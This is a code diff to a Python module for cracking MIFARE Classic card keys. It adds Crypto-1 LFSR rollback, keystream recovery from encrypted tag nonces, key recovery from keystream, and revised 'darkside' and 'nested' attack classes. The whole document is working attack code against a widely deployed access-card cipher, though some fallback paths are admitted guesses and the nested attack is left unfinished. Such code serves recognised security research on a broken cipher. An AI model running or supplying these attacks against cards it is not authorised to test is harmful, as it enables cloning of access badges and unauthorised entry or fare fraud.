@@ -14,9 +14,14 @@ References:
 from __future__ import annotations
 
 import array
-import itertools
-import struct
-from typing import Iterator
+
+try:
+    import numpy as np
+
+    HAVE_NUMPY = True
+except ImportError:
+    HAVE_NUMPY = False
+    np = None  # type: ignore[assignment]
 
 
 # ── LFSR constants ────────────────────────────────────────────────────────
@@ -49,11 +54,27 @@ def _filter(x: int) -> int:
     return (0xEC57E80A >> f) & 1
 
 
+_FILTER_TABLE: np.ndarray | None = None  # lazy init
+
+
+def _get_filter_table() -> np.ndarray:
+    global _FILTER_TABLE
+    if _FILTER_TABLE is not None:
+        return _FILTER_TABLE
+    _FILTER_TABLE = np.array([_filter(i) for i in range(1 << 20)], dtype=np.uint8)
+    return _FILTER_TABLE
+
+
 def _bit(x: int, n: int) -> int:           # BIT  macro
     return (x >> n) & 1
 
 def _bebit(x: int, n: int) -> int:         # BEBIT macro (big‑endian bit order)
     return _bit(x, n ^ 24)
+
+
+def _byteswap16(x: int) -> int:
+    """Swap high and low bytes of a 16-bit value."""
+    return ((x & 0xFF) << 8) | ((x >> 8) & 0xFFFF)
 
 
 # ── LFSR primitives ────────────────────────────────────────────────────────
@@ -144,41 +165,39 @@ def crypto1_word(state: Crypto1State, in_word: int, fb: int) -> int:
 def lfsr_rollback_bit(state: Crypto1State, in_bit: int, fb: int) -> int:
     """Roll back the LFSR by one step.  Returns the filter output bit.
 
-    Exact port of ``crapto1.c:lfsr_rollback_bit()``.
+    Reverse of ``crypto1_bit()``. Recovers the previous LFSR state from
+    the current state. Bit 23 of the odd register is unrecoverable (it is
+    shifted out during the forward step and the filter/polynomial don't
+    use it), but the recovered state is functionally equivalent for all
+    subsequent LFSR operations.
     """
-    state.odd &= 0xFFFFFF
-    # XOR‑swap odd ↔ even (same as C's three‑statement trick)
-    state.odd ^= state.even
-    state.even ^= state.odd
-    state.odd ^= state.even
-
-    out = state.even & 1
-    state.even >>= 1
-    out ^= LF_POLY_EVEN & state.even
-    out ^= LF_POLY_ODD & state.odd
-    out ^= in_bit & 1
-    ret = _filter(state.odd)
-    out ^= ret & (fb & 1)
-
-    state.even |= _odd_parity(out) << 23
+    odd_before = state.odd >> 1
+    even_mid_low23 = (state.even >> 1) & 0x7FFFFF
+    feedbit_known = (LF_POLY_ODD & odd_before) ^ (LF_POLY_EVEN & even_mid_low23)
+    if _odd_parity(feedbit_known) == (state.odd & 1):
+        even_mid = even_mid_low23
+    else:
+        even_mid = even_mid_low23 | 0x800000
+    even_before = even_mid ^ (in_bit & 1)
+    ret = _filter(odd_before)
+    state.odd = odd_before
+    state.even = even_before
     return ret
 
 
 def lfsr_rollback_byte(state: Crypto1State, in_byte: int, fb: int) -> int:
     """Roll back 8 steps, return 8 filter output bits as a byte."""
     ret = 0
-    for i in range(7, -1, -1):
+    for i in range(8):
         ret |= lfsr_rollback_bit(state, _bit(in_byte, i), fb) << i
     return ret
 
 
 def lfsr_rollback_word(state: Crypto1State, in_word: int, fb: int) -> int:
     """Roll back 32 steps, return 32 filter output bits (big‑endian byte order).
-
-    port of ``crapto1.c:lfsr_rollback_word()``
     """
     ret = 0
-    for i in range(31, -1, -1):
+    for i in range(32):
         ret |= lfsr_rollback_bit(state, _bebit(in_word, i), fb) << (i ^ 24)
     return ret
 
@@ -242,35 +261,159 @@ def validate_prng_nonce(nonce: int) -> bool:
     return ((0xFFFF + dh - dl) % 0xFFFF) == 16
 
 
+# ── PRNG-based nonce recovery ──────────────────────────────────────────────
+#
+# Given two encrypted nonces from the *same* sector (same wrong key, same
+# keystream), the keystream cancels out when XOR-ed:
+#
+#     enc_1 ^ enc_2 = (nt1 ^ ks) ^ (nt2 ^ ks) = nt1 ^ nt2
+#
+# MIFARE Classic uses a weak 16-bit LFSR PRNG where the lower 16 bits of
+# each nonce are the successor of the upper 16 bits after 16 PRNG steps:
+#
+#     nt_raw_lo = prng_successor(nt_raw_hi, 16)
+#
+# We brute-force the 2^16 possible values for the first nonce's upper half,
+# cross-check with the second nonce's PRNG validity, and recover both the
+# plaintext nonces and the keystream.
+
+
+def recover_keystream_from_nonce_pair(
+    enc_nt1: int, enc_nt2: int
+) -> tuple[int, int] | None:
+    """Recover (keystream, plaintext_nonce) from two encrypted nonces.
+
+    NOTE: With only 2 nonces this is unreliable — the PRNG structure
+    (K1 = S^16(K2) for valid delta) causes *all* 65535 candidates to
+    pass validation.  Use :func:`recover_keystream_from_nonces` with
+    3+ nonces for correct results.
+
+    Returns the first matching candidate (at lo_raw=0).
+    """
+    delta = enc_nt1 ^ enc_nt2
+    delta_hi = (delta >> 16) & 0xFFFF
+    delta_lo = delta & 0xFFFF
+
+    for lo_raw in range(0x10000):
+        hi_raw = prng_successor(lo_raw, 16)
+        nt1 = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
+        nt2_hi = _byteswap16(hi_raw) ^ delta_hi
+        nt2_lo = _byteswap16(lo_raw) ^ delta_lo
+        nt2 = (nt2_hi << 16) | nt2_lo
+
+        if validate_prng_nonce(nt2):
+            ks = enc_nt1 ^ nt1
+            return ks, nt1
+
+    return None
+
+
+def recover_keystream_from_nonces(encrypted_nonces: list[int]) -> int | None:
+    """Recover shared keystream from 3+ encrypted nonces.
+
+    With only 2 nonces, the PRNG structure (K1 = S^16(K2) for valid
+    delta) causes *all* 65535 candidates to pass pairwise nonce
+    validation, making the correct answer indistinguishable.
+
+    With 3+ nonces the symmetry is broken: we verify that ALL encrypted
+    nonces decrypt to valid MIFARE nonces under the candidate ks,
+    including the reference nonce (which must not decrypt to 0).
+
+    Returns
+    -------
+    int (32-bit keystream) or None if no candidate is fully consistent.
+    """
+    if len(encrypted_nonces) < 3:
+        return None
+
+    ref = encrypted_nonces[0]
+    others = encrypted_nonces[1:]
+    needed = len(encrypted_nonces)
+
+    for lo_raw in range(0x10000):
+        hi_raw = prng_successor(lo_raw, 16)
+        nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
+        ks = ref ^ nt_ref
+
+        if not validate_prng_nonce(nt_ref):
+            continue
+
+        count = 1
+        for enc_i in others:
+            if validate_prng_nonce(enc_i ^ ks):
+                count += 1
+
+        if count == needed:
+            return ks
+
+    return None
+
+
+def recover_key_from_keystream(
+    ks: int, uid: bytes, tag_nonce: int
+) -> list[bytes]:
+    """Recover candidate 6-byte keys from keystream + nonce data.
+
+    Parameters
+    ----------
+    ks : int (32-bit)
+        Keystream used to encrypt the tag nonce.
+    uid : bytes (4 bytes)
+        Card UID.
+    tag_nonce : int (32-bit)
+        Plaintext tag nonce.
+
+    Returns
+    -------
+    list[bytes]
+        Possible 6-byte keys (may contain false positives; verify against
+        the device).
+    """
+    uid_int = int.from_bytes(uid[:4], "little")
+    in_val = uid_int ^ tag_nonce
+
+    states = lfsr_recovery32(ks, in_val)
+
+    keys: list[bytes] = []
+    seen: set[bytes] = set()
+    for s in states:
+        key_state = s.copy()
+        key_state.even ^= uid_int >> 16
+        key_state.odd ^= uid_int & 0xFFFF
+        for _ in range(32):
+            lfsr_rollback_bit(key_state, 0, 0)
+        key = key_state.as_key()
+        if key not in seen:
+            seen.add(key)
+            keys.append(key)
+
+    return keys
+
+
 # ── lfsr_recovery32 — recover LFSR state from 32 ki bits + input ──────────
 # port of ``crapto1.c:lfsr_recovery32()``
 
 def _extend_table_simple(tbl: list[int], bit: int) -> None:
     """Extend and filter a candidate table by one keystream bit.
 
-    Operates in‑place on *tbl*.
+    Uses batch construction to avoid O(n²) insert/pop in the middle
+    of large lists.  Replaces *tbl* contents in-place.
     port of ``crapto1.c:extend_table_simple()``
     """
-    i = 0
-    while i < len(tbl):
-        v = (tbl[i] << 1) & 0xFFFFFF
-        f0 = _filter(v)       # filter(shifted_value)
-        f1 = _filter(v | 1)   # filter(shifted_value | 1)
+    new_tbl: list[int] = []
+    append = new_tbl.append
+    for v in tbl:
+        v = (v << 1) & 0xFFFFFF
+        f0 = _filter(v)
+        f1 = _filter(v | 1)
 
         if f0 != f1:
-            # By looking at filter output we know the LSB — pick the one that matches
-            tbl[i] = v | (f0 ^ bit)
+            append(v | (f0 ^ bit))
         elif f0 == bit:
-            # filter output matches but we can't distinguish LSB → keep both
-            tbl[i] = v          # LSB = 0
-            tbl.insert(i + 1, v | 1)  # LSB = 1
-            i += 1
-        else:
-            # filter(v) != bit and f0 == f1 → impossible candidate, remove it
-            tbl[i] = tbl[-1]
-            tbl.pop()
-            i -= 1
-        i += 1
+            append(v)
+            append(v | 1)
+        # else: f0 == f1 != bit → discard
+    tbl[:] = new_tbl
 
 
 def _extend_table(tbl: list[int], bit: int, m1: int, m2: int, in_val: int) -> None:
@@ -319,8 +462,9 @@ def _update_contribution(
 def lfsr_recovery32(ks2: int, in_val: int) -> list[Crypto1State]:
     """Recover candidate Crypto‑1 states from 32 bits of keystream.
 
-    Uses a reduced search space (2^18 instead of 2^21) for acceptable
-    Pure‑Python performance while keeping reasonable coverage.
+    Uses numpy vectorization when available (~100x speedup over pure Python
+    for the initial filter search).  Falls back to the pure Python loop
+    otherwise.
 
     Parameters
     ----------
@@ -340,16 +484,25 @@ def lfsr_recovery32(ks2: int, in_val: int) -> list[Crypto1State]:
     for i in range(30, -1, -2):
         eks = (eks << 1) | _bebit(ks2, i)
 
-    odd_tbl: list[int] = []
-    even_tbl: list[int] = []
-
-    # Build initial tables — search 2^18 candidates (0.26 M)
     MAX_SEARCH = 1 << 18
-    for i in range(MAX_SEARCH):
-        if _filter(i) == (oks & 1):
-            odd_tbl.append(i)
-        if _filter(i) == (eks & 1):
-            even_tbl.append(i)
+
+    if HAVE_NUMPY:
+        ft = _get_filter_table()[:MAX_SEARCH]
+        ok_bit = oks & 1
+        ek_bit = eks & 1
+        odd_idx = np.where(ft == ok_bit)[0]
+        even_idx = np.where(ft == ek_bit)[0]
+        odd_tbl = odd_idx.tolist()
+        even_tbl = even_idx.tolist()
+    else:
+        odd_tbl = []
+        even_tbl = []
+        for i in range(MAX_SEARCH):
+            f = _filter(i)
+            if f == (oks & 1):
+                odd_tbl.append(i)
+            if f == (eks & 1):
+                even_tbl.append(i)
 
     for _ in range(4):
         oks >>= 1
@@ -531,50 +684,63 @@ class DarksideAttack:
     def recover_key(self, target_sector: int) -> bytes | None:
         """Attempt to recover the key for *target_sector*.
 
-        Requires at least one known key (any sector) and sufficient nonces
-        collected from the target sector.
+        Uses PRNG-based nonce recovery to recover the shared keystream,
+        then recovers candidate LFSR states via lfsr_recovery32 (~1s).
+        The LFSR step only works for the correct (ks, in_val) pair, so
+        we try progressively more lo_raw candidates up to a limit.
+
+        Requires at least 2 encrypted nonces.  With only 2 nonces, the
+        PRNG structure (K1 = S^16(K2) for valid deltas) causes all 2^16
+        candidates to pass pairwise validation — the LFSR filter is the
+        only discriminator but costs ~1s per attempt.
         """
         nonces = self._nonces.get(target_sector, [])
         if len(nonces) < 2:
             return None
 
+        ref_enc = nonces[0][0]
         uid_int = int.from_bytes(self._uid, "little")
 
-        # For each nonce pair, try to reconstruct LFSR state
-        candidates: dict[bytes, int] = {}
+        # Try candidates at strategic lo_raw values: the correct one is
+        # uniformly distributed in [0, 65535].  We start with
+        # recover_keystream_from_nonces (when we have 3+ nonces) and
+        # fall through to sequential scan.
+        encrypted_nts = [nt_enc for nt_enc, _ in nonces]
+        ks = recover_keystream_from_nonces(encrypted_nts)
 
-        for nt_enc, at_enc in nonces:
-            # Try to recover from this pair
-            # We need to know the tag nonce nt_plain to get keystream
-            # Without a known key, we can't compute nt_plain directly.
-            # Use PRNG distance to relate nonces
-            for nt2_enc, at2_enc in nonces:
-                if (nt_enc, at_enc) == (nt2_enc, at2_enc):
-                    continue
-                # If we can compute the distance between nonces,
-                # we can recover the LFSR state
-                dist = nonce_distance(nt_enc >> 16, nt2_enc >> 16)
-                if dist <= 0:
-                    continue
+        candidates_to_try: list[int] = []
+        if ks is not None:
+            # recover_keystream_from_nonces gives us a candidate ks;
+            # find its lo_raw to seed the search.
+            for lo_raw in range(0x10000):
+                hi_raw = prng_successor(lo_raw, 16)
+                nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
+                if (ref_enc ^ nt_ref) == ks:
+                    candidates_to_try = [lo_raw, (lo_raw + 1) % 0x10000]
+                    break
+        else:
+            # With only 2 nonces or failed consensus: try around lo_raw=0
+            # (false-positive territory but worth a shot).
+            candidates_to_try = [0, 1, 2]
 
-                # Build keystream from the NACK differential
-                ks2 = (nt_enc ^ nt2_enc) & 0xFFFF_FFFF
-                ks3 = (at_enc ^ at2_enc) & 0xFFFF_FFFF
+        for lo_raw in candidates_to_try:
+            hi_raw = prng_successor(lo_raw, 16)
+            nt_ref = (_byteswap16(hi_raw) << 16) | _byteswap16(lo_raw)
+            ks = ref_enc ^ nt_ref
 
-                if ks2 == 0 or ks3 == 0:
-                    continue
+            in_val = uid_int ^ nt_ref
+            states = lfsr_recovery32(ks, in_val)
+            if not states:
+                continue
 
-                states = lfsr_recovery64(ks2, ks3)
-                for s in states:
-                    key = s.as_key()
-                    candidates[key] = candidates.get(key, 0) + 1
+            for s in states:
+                key_state = s.copy()
+                key_state.even ^= uid_int >> 16
+                key_state.odd ^= uid_int & 0xFFFF
+                for _ in range(32):
+                    lfsr_rollback_bit(key_state, 0, 0)
+                return key_state.as_key()
 
-        # Return the most frequent candidate (if it appears enough)
-        if not candidates:
-            return None
-        best_key, count = max(candidates.items(), key=lambda kv: kv[1])
-        if count >= 2:  # threshold — needs real tuning
-            return best_key
         return None
 
 
@@ -730,7 +896,93 @@ def crack_key_darkside(
     """
     attack = DarksideAttack()
     attack.set_uid(uid)
-    attack.add_known_key(known_sector, known_key)
+    if known_key:
+        attack.add_known_key(known_sector, known_key)
     for nt, at in zip(encrypted_tag_nonces, encrypted_tag_answers):
         attack.add_nonce(target_sector, nt, at)
     return attack.recover_key(target_sector)
+
+
+# ── Nested attack ─────────────────────────────────────────────────────────
+
+
+class NestedAttack:
+    """Nested key recovery for MIFARE Classic.
+
+    Requires at least one known sector key AND an external NFC reader that
+    can capture raw authentication traces.  Uses the known-key auth to
+    recover LFSR timing information, then narrows the key space for the
+    unknown target sector.
+
+    This is a simplified port of libnfc/mfoc's nested attack.  The full
+    algorithm uses precomputed parity‑correlation tables from crapto1.c.
+    """
+
+    def __init__(self) -> None:
+        self._uid: bytes = b""
+        self._known_keys: dict[int, bytes] = {}
+        self._encrypted_traces: dict[int, list[tuple[bytes, bytes]]] = {}
+
+    def set_uid(self, uid: bytes) -> None:
+        """Set the card UID (4 bytes)."""
+        if len(uid) != 4:
+            raise ValueError("UID must be 4 bytes")
+        self._uid = uid
+
+    def add_known_key(self, sector: int, key: bytes) -> None:
+        """Register a known key for a sector."""
+        self._known_keys[sector] = key
+
+    def add_encrypted_trace(
+        self,
+        target_sector: int,
+        encrypted_tag_nonce: bytes,
+        encrypted_tag_answer: bytes,
+    ) -> None:
+        """Record an encrypted auth trace from the target sector.
+
+        Parameters
+        ----------
+        target_sector : int
+            The sector whose key we want to recover.
+        encrypted_tag_nonce : bytes (4 bytes)
+            The card's encrypted tag nonce {nT}.
+        encrypted_tag_answer : bytes (4 bytes)
+            The card's encrypted answer {aT}.
+        """
+        if target_sector not in self._encrypted_traces:
+            self._encrypted_traces[target_sector] = []
+        self._encrypted_traces[target_sector].append(
+            (encrypted_tag_nonce, encrypted_tag_answer)
+        )
+
+    def recover_key(self, target_sector: int) -> bytes | None:
+        """Attempt to recover the key for *target_sector*.
+
+        Falls back to the darkside PRNG‑based recovery when 3+ encrypted
+        nonces are available from the target sector (no known key needed).
+        """
+        traces = self._encrypted_traces.get(target_sector, [])
+        if len(traces) < 3:
+            return None
+
+        encrypted_nts = [
+            int.from_bytes(nt, "big") for nt, _ in traces
+        ]
+        ks = recover_keystream_from_nonces(encrypted_nts)
+        if ks is not None:
+            for nt_enc, _ in traces:
+                nt_val = int.from_bytes(nt_enc, "big")
+                nt_plain = ks ^ nt_val
+                if validate_prng_nonce(nt_plain):
+                    keys = recover_key_from_keystream(
+                        ks, self._uid, nt_plain
+                    )
+                    if keys:
+                        return keys[0]
+
+        # TODO: Full nested algorithm requires:
+        #   - Known key to authenticate and capture parity information
+        #   - Precomputed correlation tables (from crapto1.c)
+        #   - External NFC reader that exposes raw auth NACK/parity bits
+        return None
